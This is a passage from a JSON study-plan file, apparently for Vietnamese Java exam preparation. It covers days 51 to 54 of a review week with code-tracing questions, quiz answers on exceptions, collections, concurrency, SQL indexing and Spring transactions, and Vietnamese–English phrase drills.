          "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
          "en": "Show error message if Start date is greater than End date"
        },
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        },
        {
          "id": 74,
          "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
          "en": "Get all data list from database"
        },
        {
          "id": 75,
          "vi": "lấy giá trị của phương thức X gán vào biến Y",
          "en": "Set value of method X for variable Y"
        },
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        }
      ],
      "summary": "Tuần 8 Final Review: Rà soát Java Core Ch4, Ch5 (Flow Control, Exceptions, OOP Rules).",
      "coreTheory": "Ôn lại 4 quy tắc Method Overriding, thứ tự thực thi try-catch-finally, static method hiding và constructor chaining.",
      "codeSnippet": "// Rà soát Ch4-Ch5",
      "traps": [
        "return trong finally nuốt exception."
      ],
      "quickQuiz": [
        {
          "q": "Từ khóa `volatile` trong Java giải quyết vấn đề gì trong đa luồng?",
          "a": "Đảm bảo tính hiển thị (Visibility): Mọi thao tác đọc/ghi biến `volatile` đều tương tác trực tiếp với bộ nhớ chính (Main Memory), không lưu trong CPU Cache, ngăn chặn hiện tượng stale data giữa các CPU cores."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Flow control, Exceptions bẫy return finally, OOP rules.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "Ôn lại 4 quy tắc Method Overriding, thứ tự thực thi try-catch-finally, static method hiding và constructor chaining.",
          "code": "// Rà soát Ch4-Ch5"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d51_1",
          "level": "Hard",
          "question": "Đoạn code rà soát Ch4-5 về Exception và Constructor sau in ra gì?",
          "code": "class Parent {\n    Parent() { System.out.print(\"P \"); }\n}\nclass Child extends Parent {\n    Child() {\n        this(\"C \");\n        System.out.print(\"D \");\n    }\n    Child(String s) {\n        System.out.print(s);\n    }\n}\npublic class ConsTrace {\n    public static void main(String[] args) {\n        new Child();\n    }\n}",
          "options": [
            "P C D ",
            "C D P ",
            "P D C ",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "1. `new Child()` gọi constructor không tham số `Child()`.\n2. Dòng đầu là `this(\"C \")`, gọi sang `Child(String s)`.\n3. Trong `Child(String s)`, compiler tự động chèn `super()` ở dòng đầu tiên, nên constructor `Parent()` chạy trước, in ra `P `.\n4. Sau đó `Child(String s)` in ra `C `.\n5. Trở về `Child()`, dòng tiếp theo in `D `.\nKết quả in ra: `P C D `."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: return trong finally nuốt exception.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát Ch4-Ch5",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vấn đáp Audit 1-1: Concurrency Internals",
          "questions": [
            {
              "q": "Khái niệm Thread Pool là gì và lợi ích cốt lõi của nó?",
              "ans": "Thread Pool là tập hợp các worker threads được khởi tạo sẵn và quản lý tập trung. Lợi ích: Tái sử dụng thread, tránh chi phí cấp phát và hủy thread của hệ điều hành, giới hạn số thread đồng thời để chống quá tải CPU và tràn bộ nhớ."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Khác biệt giữa Callable và Runnable",
          "questions": [
            {
              "q": "So sánh `Callable<V>` và `Runnable` trong Java Concurrency.",
              "ans": "`Runnable` có phương thức `run()` trả về `void` và không thể ném Checked Exception. `Callable<V>` có phương thức `call()` trả về kết quả kiểu `V` thông qua `Future<V>` và được phép ném Checked Exception."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Future.get() chặn luồng",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nExecutorService exec = Executors.newSingleThreadExecutor();\nFuture<String> future = exec.submit(() -> {\n    Thread.sleep(100);\n    return \"Done\";\n});\nSystem.out.print(\"Waiting \");\nSystem.out.println(future.get());\nexec.shutdown();\n```\nKết quả in ra và hành vi của hàm `future.get()` là gì?",
              "ans": "In ra: `Waiting Done`. Lệnh `future.get()` là thao tác đồng bộ chặn luồng (blocking): Luồng `main` sẽ bị treo và chờ cho đến khi tác vụ chạy xong trong thread pool và trả về chuỗi \"Done\"."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy CountDownLatch không thể tái sử dụng",
          "questions": [
            {
              "q": "Sự khác biệt cốt lõi giữa `CountDownLatch` và `CyclicBarrier` là gì?",
              "ans": "`CountDownLatch` chỉ đếm lùi về 0 một lần duy nhất và KHÔNG THỂ tái sử dụng lại. `CyclicBarrier` có thể tái sử dụng (reset) nhiều lần sau khi các thread đã gặp nhau tại điểm hẹn."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Xử lý ABA Problem với AtomicStampedReference",
          "questions": [
            {
              "q": "Vấn đề ABA Problem trong thuật toán Lock-free là gì và Java giải quyết bằng cách nào?",
              "ans": "ABA xảy ra khi giá trị ban đầu là A, bị thread khác đổi thành B rồi đổi lại thành A; thread ban đầu kiểm tra thấy vẫn là A nên tưởng như chưa hề có thay đổi. Java giải quyết bằng `AtomicStampedReference` (lưu kèm một con số phiên bản/timestamp nguyên tử)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_51_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Flow control, Exceptions bẫy return finally, OOP rules?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Flow control, Exceptions bẫy return finally, OOP rules phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Flow control, Exceptions bẫy return finally, OOP rules."
        },
        {
          "id": "da_51_2",
          "q": "Khi thao tác với Flow control, Exceptions bẫy return finally, OOP rules, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tổng kết 3 bẫy luồng thực thi và ngoại lệ trong Java Core Chương 4 - 5?",
          "a": "1. Lệnh return trong khối finally ghi đè return của try.\n2. Thứ tự bắt catch: Bắt exception cha trước exception con gây Compile Error.\n3. Hàm tạo lớp con ngầm gọi `super()` không tham số của lớp cha.",
          "trap": "Kiểm tra xem lớp cha có constructor mặc định không trước khi trace lớp con."
        }
      ],
      "dailyEnglish": [
        {
          "id": 72,
          "vi": "Hiển thị lỗi nếu ngày bắt đầu lớn hơn ngày kết thúc",
          "en": "Show error message if Start date is greater than End date"
        },
        {
          "id": 73,
          "vi": "Lấy dữ liệu trường id từ form",
          "en": "Get data of ID field from form"
        },
        {
          "id": 74,
          "vi": "Lấy tất cả danh sách dữ liệu có trong cơ sở dữ liệu",
          "en": "Get all data list from database"
        },
        {
          "id": 75,
          "vi": "lấy giá trị của phương thức X gán vào biến Y",
          "en": "Set value of method X for variable Y"
        },
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        }
      ]
    },
    "52": {
      "day": 52,
      "week": 8,
      "title": "Rà soát Java Core Ch6, Ch7",
      "topics": [
        "String Pool, equals vs ==, Collections, Map"
      ],
      "tasks": [
        "Đọc lại flashcards Ch6-7",
        "Làm nhanh 20 câu trắc nghiệm"
      ],
      "englishDrill": [
        {
          "id": 75,
          "vi": "lấy giá trị của phương thức X gán vào biến Y",
          "en": "Set value of method X for variable Y"
        },
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        },
        {
          "id": 77,
          "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
          "en": "If A>B, update student information, else, add student information."
        },
        {
          "id": 78,
          "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
          "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
        },
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        }
      ],
      "summary": "Tuần 8 Final Review: Rà soát Java Core Ch6, Ch7 (String Pool, Wrappers, Collections, Map).",
      "coreTheory": "Ôn lại String Pool, Integer Cache -128..127, ma trận Collections (Duplicate, Ordered, Sorted, Thread-safe), hợp đồng equals/hashCode.",
      "codeSnippet": "// Rà soát Ch6-Ch7",
      "traps": [
        "TreeSet cần Comparable, Hashtable cấm null."
      ],
      "quickQuiz": [
        {
          "q": "Mệnh đề `HAVING` khác mệnh đề `WHERE` trong câu lệnh SQL ở điểm cốt lõi nào?",
          "a": "`WHERE` lọc dữ liệu của từng dòng trước khi gom nhóm (không dùng được hàm tổng hợp aggregate); `HAVING` lọc các nhóm dữ liệu sau khi `GROUP BY` đã hoàn thành (dùng được COUNT, SUM, AVG,...)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: String Pool, equals vs ==, Collections, Map.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "Ôn lại String Pool, Integer Cache -128..127, ma trận Collections (Duplicate, Ordered, Sorted, Thread-safe), hợp đồng equals/hashCode.",
          "code": "// Rà soát Ch6-Ch7"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d52_1",
          "level": "Hard",
          "question": "Đoạn code rà soát Ch6-7 về String Pool và Map sau in ra kết quả gì?",
          "code": "import java.util.*;\npublic class Ch67Review {\n    public static void main(String[] args) {\n        String s1 = \"Java\";\n        String s2 = new String(\"Java\");\n        Map<String, Integer> map = new HashMap<>();\n        map.put(s1, 10);\n        map.put(s2, 20);\n        System.out.println(map.size() + \" \" + (s1 == s2));\n    }\n}",
          "options": [
            "1 false",
            "2 false",
            "1 true",
            "2 true"
          ],
          "correctIndex": 0,
          "explanation": "1. `s1` ở String Pool, `s2` ở Heap thông thường, nên `s1 == s2` so sánh địa chỉ tham chiếu trả về `false`.\n2. Tuy nhiên, `HashMap` so sánh key bằng `equals()` và `hashCode()`. Do `s1.equals(s2) == true` và có cùng hashCode, key `s2` ghi đè giá trị của `s1`. Kích thước map chỉ là `1`.\nKết quả in ra: `1 false`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: TreeSet cần Comparable, Hashtable cấm null.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát Ch6-Ch7",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vấn đáp Audit 1-1: Database Indexing & Tuning",
          "questions": [
            {
              "q": "Cấu trúc dữ liệu phổ biến nhất được các hệ quản trị CSDL sử dụng để tạo Index là gì?",
              "ans": "Cây `B-Tree` (hoặc biến thể `B+ Tree`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Clustered Index vs Non-Clustered Index",
          "questions": [
            {
              "q": "Sự khác biệt giữa Clustered Index và Non-Clustered Index là gì?",
              "ans": "Clustered Index: Xác định thứ tự lưu trữ vật lý thực tế của các dòng dữ liệu trên đĩa cứng; mỗi bảng chỉ có DUY NHẤT 1 Clustered Index (thường là Primary Key). Non-Clustered Index: Cấu trúc riêng biệt chứa giá trị của cột được đánh index kèm con trỏ trỏ tới dòng dữ liệu thực tế; một bảng có thể có nhiều Non-Clustered Index."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace câu lệnh làm vô hiệu hóa Index",
          "questions": [
            {
              "q": "Cho cột `created_at` đã được đánh Index. Câu truy vấn nào sau đây TẬN DỤNG được Index:\n1) `WHERE YEAR(created_at) = 2026;`\n2) `WHERE created_at >= '2026-01-01' AND created_at < '2027-01-01';`?",
              "ans": "Câu 2 tận dụng được Index! Câu 1 áp dụng hàm `YEAR()` lên cột khiến CSDL không thể dùng B-Tree để tìm kiếm nhị phân mà phải quét toàn bộ bảng (Table Scan / Index Scan)."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy chi phí khi đánh quá nhiều Index",
          "questions": [
            {
              "q": "Tại sao không nên tạo Index trên mọi cột của một bảng trong CSDL?",
              "ans": "Mặc dù Index tăng tốc độ truy vấn `SELECT`, nhưng nó làm chậm đáng kể các thao tác ghi dữ liệu (`INSERT`, `UPDATE`, `DELETE`) vì CSDL phải cập nhật lại toàn bộ cây chỉ mục B-Tree tương ứng, đồng thời gây tốn dung lượng ổ đĩa."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Giải thích câu lệnh EXPLAIN PLAN trong SQL",
          "questions": [
            {
              "q": "Khi đọc kết quả câu lệnh `EXPLAIN` trong MySQL/Postgres, chỉ số `type` nào biểu thị hiệu năng tối ưu nhất và tệ nhất?",
              "ans": "Tối ưu nhất: `const` / `eq_ref` (truy xuất trực tiếp theo khóa chính/duy nhất). Tệ nhất: `ALL` (Full Table Scan - quét sạch toàn bộ bảng)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_52_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề String Pool, equals vs ==, Collections, Map?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của String Pool, equals vs ==, Collections, Map phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần String Pool, equals vs ==, Collections, Map."
        },
        {
          "id": "da_52_2",
          "q": "Khi thao tác với String Pool, equals vs ==, Collections, Map, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tổng kết 3 bẫy chuỗi và tập hợp trong Java Core Chương 6 - 7?",
          "a": "1. Dùng toán tử `==` so sánh String hoặc Wrapper objects thay vì `.equals()`.\n2. Không override đồng thời cả `equals()` và `hashCode()` khi lưu vào HashMap/HashSet.\n3. Thêm phần tử `null` vào `TreeSet` gây NullPointerException.",
          "trap": "Nhớ kỹ khoảng cache của Integer (-128 đến 127)."
        }
      ],
      "dailyEnglish": [
        {
          "id": 75,
          "vi": "lấy giá trị của phương thức X gán vào biến Y",
          "en": "Set value of method X for variable Y"
        },
        {
          "id": 76,
          "vi": "Hiển thị message lỗi trên khu vực thông báo lỗi với nội dung:  Ngày sinh không hợp lệ. Vui lòng nhập ngày có format XYZ.",
          "en": "Show error message on error message area with content: Invalid birthday, please input the date with XYZ format ."
        },
        {
          "id": 77,
          "vi": "Nếu A>B thì tiến hành update thông tin học sinh. Ngược lại hãy xử lí thêm mới thông tin học sinh.",
          "en": "If A>B, update student information, else, add student information."
        },
        {
          "id": 78,
          "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
          "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
        },
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        }
      ]
    },
    "53": {
      "day": 53,
      "week": 8,
      "title": "Rà soát Java Core Ch8, Ch9",
      "topics": [
        "Inner classes, Thread states, synchronized"
      ],
      "tasks": [
        "Đọc lại flashcards Ch8-9",
        "Làm nhanh 20 câu trắc nghiệm"
      ],
      "englishDrill": [
        {
          "id": 78,
          "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
          "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
        },
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        },
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches"
        },
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        }
      ],
      "summary": "Tuần 8 Final Review: Rà soát Java Core Ch8, Ch9 (Inner Classes, Threads, Locks).",
      "coreTheory": "Ôn lại Method-local inner class effectively final, Thread.sleep vs Object.wait, synchronized monitor locks.",
      "codeSnippet": "// Rà soát Ch8-Ch9",
      "traps": [
        "wait() phải gọi trong synchronized."
      ],
      "quickQuiz": [
        {
          "q": "Trong kiến trúc Spring MVC, đối tượng nào quyết định gọi Controller nào dựa trên URL của Request?",
          "a": "`HandlerMapping` phân tích URL và metadata của request để tìm kiếm và trả về HandlerExecutionChain chứa Controller tương ứng cho DispatcherServlet."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Inner classes, Thread states, synchronized.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "Ôn lại Method-local inner class effectively final, Thread.sleep vs Object.wait, synchronized monitor locks.",
          "code": "// Rà soát Ch8-Ch9"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d53_1",
          "level": "Hard",
          "question": "Đoạn code rà soát Ch8-9 về Anonymous Class và Thread sau in ra gì?",
          "code": "public class Ch89Review {\n    public static void main(String[] args) {\n        final StringBuilder sb = new StringBuilder(\"A\");\n        Runnable r = new Runnable() {\n            public void run() {\n                sb.append(\"B\");\n            }\n        };\n        r.run();\n        System.out.println(sb);\n    }\n}",
          "options": [
            "AB",
            "A",
            "Compile Error vì StringBuilder bị final",
            "Compile Error vì không gọi start"
          ],
          "correctIndex": 0,
          "explanation": "1. Biến `sb` là `final`, cho phép Anonymous Inner Class truy cập an toàn.\n2. Từ khóa `final` chỉ cấm gán lại con trỏ `sb = new StringBuilder()`, không cấm thay đổi trạng thái bên trong đối tượng (`sb.append(\"B\")` hoàn toàn hợp lệ).\n3. `r.run()` chạy phương thức tuần tự, nối 'B' vào. Kết quả in ra: `AB`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: wait() phải gọi trong synchronized.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát Ch8-Ch9",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Vấn đáp Audit 1-1: Spring Internals & Transaction",
          "questions": [
            {
              "q": "Annotation `@Transactional` trong Spring hoạt động dựa trên kỹ thuật cốt lõi nào?",
              "ans": "Dựa trên Spring AOP (Aspect-Oriented Programming) và Dynamic Proxy (JDK Dynamic Proxy hoặc CGLIB Proxy)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Self-invocation pitfall trong @Transactional",
          "questions": [
            {
              "q": "Tại sao một phương thức không có `@Transactional` gọi một phương thức khác CÙNG CLASS có `@Transactional` thì Transaction lại KHÔNG hoạt động?",
              "ans": "Vì lời gọi nội bộ (`this.method()`) không đi qua Spring Proxy. Do đó Spring AOP không thể chặn (intercept) lời gọi để mở transaction hay commit/rollback."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace rollbackOn mặc định của Spring @Transactional",
          "questions": [
            {
              "q": "Nếu một phương thức có `@Transactional` ném ngoại lệ `IOException` (Checked Exception) thì Spring có tự động rollback Transaction không?",
              "ans": "Mặc định là KHÔNG rollback! Spring `@Transactional` mặc định chỉ tự động rollback khi gặp `RuntimeException` (Unchecked Exception) hoặc `Error`. Muốn rollback với Checked Exception phải khai báo: `@Transactional(rollbackFor = Exception.class)`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Transaction Propagation: REQUIRES_NEW",
          "questions": [
            {
              "q": "Propagation `REQUIRES_NEW` khác gì so với `REQUIRED` (mặc định)?",
              "ans": "`REQUIRED`: Sử dụng transaction hiện tại nếu có, nếu chưa thì tạo mới. `REQUIRES_NEW`: Luôn luôn tạm dừng (suspend) transaction hiện tại và tạo một transaction độc lập hoàn toàn mới; lỗi ở transaction mới có thể rollback độc lập với transaction cũ."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "CGLIB Proxy vs JDK Dynamic Proxy",
          "questions": [
            {
              "q": "Khi nào Spring sử dụng JDK Dynamic Proxy và khi nào sử dụng CGLIB Proxy?",
              "ans": "JDK Dynamic Proxy được dùng khi target class thực thi ít nhất một Interface (tạo proxy implements interface đó). CGLIB được dùng khi target class không thực thi interface nào (tạo class con kế thừa target class thông qua sinh byte-code động)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_53_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Inner classes, Thread states, synchronized?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Inner classes, Thread states, synchronized phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Inner classes, Thread states, synchronized."
        },
        {
          "id": "da_53_2",
          "q": "Khi thao tác với Inner classes, Thread states, synchronized, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Tổng kết 3 bẫy Inner Class và Đa luồng trong Java Core Chương 8 - 9?",
          "a": "1. Member inner class bắt buộc phải tạo từ một instance của outer class (`new Outer().new Inner()`).\n2. Gọi `t.run()` thay vì `t.start()` không tạo luồng mới.\n3. Gọi `wait()` ngoài khối synchronized ném IllegalMonitorStateException.",
          "trap": "Static nested class không truy cập được biến non-static của outer class."
        }
      ],
      "dailyEnglish": [
        {
          "id": 78,
          "vi": "Đếm số record thõa mãn điều kiện abc. Nếu số record trả về lớn hơn Y thì hãy hiển thị thông tin xyz lên màn hình.",
          "en": "Count records which satisfy abc condition. If number of returned records is greater than Y, show information xyz on screen."
        },
        {
          "id": 79,
          "vi": "Nếu giá trị nhập vào của item A là xxx thì hãy chuyển đổi thành yyy, sau đó đăng kí vào database với định dạng zzz.",
          "en": "If inputted value of item A is xxx, convert to yyy, then register into database with zzz format."
        },
        {
          "id": 1,
          "vi": "Lấy danh sách các trận đấu",
          "en": "Get list of matches"
        },
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        }
      ]
    },
    "54": {
      "day": 54,
      "week": 8,
      "title": "Rà soát SQL & JavaWeb",
      "topics": [
        "SQL JOINs, GROUP BY/HAVING, Servlet lifecycle, Scopes, Forward vs Redirect"
      ],
      "tasks": [
        "Luyện 15 câu SQL + 15 câu Web",
        "Rà soát bảng so sánh"
      ],
      "englishDrill": [
        {
          "id": 2,
          "vi": "Thực hiện xóa các trận đấu",
          "en": "Delete matches"
        },
        {
          "id": 3,
          "vi": "Tìm kiếm các trận đấu theo ngày giờ",
          "en": "Search matches by time"
        },
        {
          "id": 4,
          "vi": "Thực hiện thêm các trận đấu",
          "en": "Add matches"
        },
        {
          "id": 5,
          "vi": "(Kiểm tra [var] có tồn tại hay không )",
          "en": "Check if [var] exists"
        },
        {
          "id": 6,
          "vi": "return true if [var] exist or false if not exist (Trả về \"true\" nếu [var] tồn tại hoặc \"false\"nếu [var] không tồn tại",
          "en": "Return \"True\" if [var] exists or false if [var] does not exist"
        }
      ],
      "summary": "Tuần 8 Final Review: Rà soát SQL Queries & JavaWeb (JSP/Servlet).",
      "coreTheory": "Ôn lại INNER vs LEFT JOIN, WHERE vs HAVING, DELETE vs TRUNCATE, Vòng đời Servlet, 4 Scopes, Forward vs Redirect.",
      "codeSnippet": "// Rà soát SQL & Web",
      "traps": [
        "WHERE o.id IS NULL trong LEFT JOIN, Forward không đổi URL."
      ],
      "quickQuiz": [
        {
          "q": "Functional Interface `Predicate<T>`, `Consumer<T>`, `Supplier<T>`, `Function<T, R>` nhận vào và trả về kiểu gì?",
          "a": "`Predicate<T>`: nhận T -> trả về boolean; `Consumer<T>`: nhận T -> không trả về (void); `Supplier<T>`: không nhận tham số -> trả về T; `Function<T, R>`: nhận T -> trả về R."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
